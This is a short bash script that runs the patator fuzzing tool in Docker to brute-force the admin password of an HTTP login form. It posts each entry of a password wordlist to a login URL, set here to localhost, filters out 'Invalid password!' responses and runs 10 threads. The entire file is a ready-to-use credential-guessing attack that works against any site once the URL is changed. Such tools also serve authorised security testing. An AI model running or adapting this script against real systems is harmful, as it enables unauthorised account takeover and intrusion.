#!/usr/bin/env bash

pass='/tmp/pass.txt'
url='https://127.0.0.1/login'
ignore='Invalid password!'

docker run --rm -it -v $pass:/F0 \
patator http_fuzz url=$url method=POST \
body='user=admin&password=FILE0' 0=/F0 \
-x ignore:fgrep="$ignore" --threads=10
